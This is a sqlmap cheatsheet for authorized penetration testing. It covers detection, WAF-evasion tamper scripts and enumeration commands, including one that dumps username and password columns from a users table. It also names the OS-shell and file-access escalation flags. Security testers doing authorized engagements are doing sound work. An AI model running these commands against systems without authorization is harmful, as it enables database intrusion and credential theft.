# sqlmap Cheatsheet

sqlmap automates detection and extraction once a candidate parameter is
known. Point it at a *confirmed* candidate (per `detection-techniques.md`)
rather than a whole site, to keep request volume proportionate.

## Basic detection

```bash
# Single GET parameter
sqlmap -u "https://target.tld/item?id=1" -p id

# From a captured request file (recommended for POST/headers/cookies —
# export from Burp/ZAP as "Copy to file" / "Save request")
sqlmap -r request.txt -p id

# Through an intercepting proxy, so every sqlmap request is visible
# in Burp for review during the engagement
sqlmap -u "https://target.tld/item?id=1" --proxy="http://127.0.0.1:8080"
```

## Scoping to a known injection type/engine

Once manual testing has already told you the technique and engine, tell
sqlmap directly — this avoids it re-probing every technique and every
engine's syntax against the target, which cuts request volume a lot:

```bash
sqlmap -u "https://target.tld/item?id=1" \
  --dbms=mysql \
  --technique=BT \        # B=boolean-blind, T=time-blind (match what you confirmed)
  --risk=1 --level=1      # start conservative; raise only if needed
```

`--technique` letters: `B` boolean, `E` error-based, `U` UNION, `S`
stacked queries, `T` time-based, `Q` inline queries.

`--risk` (1-3) controls how aggressive/potentially-disruptive the
payloads are (3 includes payloads that can affect data in some
configurations — stay at 1-2 unless the engagement explicitly authorizes
more). `--level` (1-5) controls how many injection points/payload
variants are tried, including headers and cookies at higher levels.

## Rate limiting

```bash
sqlmap -u "..." --delay=1 --threads=1 --time-sec=5
```

Use `--delay` (seconds between requests) and keep `--threads` low on
anything with real users behind it. `--time-sec` controls the sleep
duration used for time-based payloads — leave it at the default (5)
unless network jitter is causing false negatives.

## Enumeration, once injection is confirmed

```bash
sqlmap -u "..." --batch --dbs                      # list databases
sqlmap -u "..." --batch -D appdb --tables           # list tables in a database
sqlmap -u "..." --batch -D appdb -T users --columns # list columns
sqlmap -u "..." --batch -D appdb -T users -C username,password --dump
```

`--batch` accepts sqlmap's default answer to prompts (non-interactive —
useful in scripts, but review what it's about to do first on a new
target). Prefer dumping only the specific columns needed to prove impact
over a bare `--dump` of an entire sensitive table.

## Authentication / session context

```bash
sqlmap -u "..." --cookie="session=abc123"
sqlmap -u "..." --headers="Authorization: Bearer <token>"
sqlmap -r authenticated_request.txt   # simplest: capture a logged-in request
```

## Tamper scripts (WAF/filter testing)

Only relevant when the engagement's scope includes assessing a WAF's
effectiveness — this is testing a control you're authorized to test, not
a way to sneak past a boundary you aren't authorized to cross:

```bash
sqlmap -u "..." --tamper=space2comment,charencode
```

List available scripts with `sqlmap --list-tampers`. Document which
tamper scripts were needed in the report — that itself is a finding
about WAF coverage gaps.

## Reading the current DB user's privileges (impact assessment)

```bash
sqlmap -u "..." --current-user --is-dba --privileges
```

Useful for the report's impact section: a DBA-privileged injection is a
materially worse finding than one running as a locked-down read-only
account.

## Stopping at proof, not full compromise

Flags like `--os-shell`, `--os-pwn`, and `--file-write`/`--file-read`
exist in sqlmap but cross from "SQL injection" into "remote code
execution" and "arbitrary file access." Only use them when the
engagement's rules of engagement explicitly authorize escalation testing
— for most engagements, confirming the injection and extracting the
minimum proof data is the deliverable.
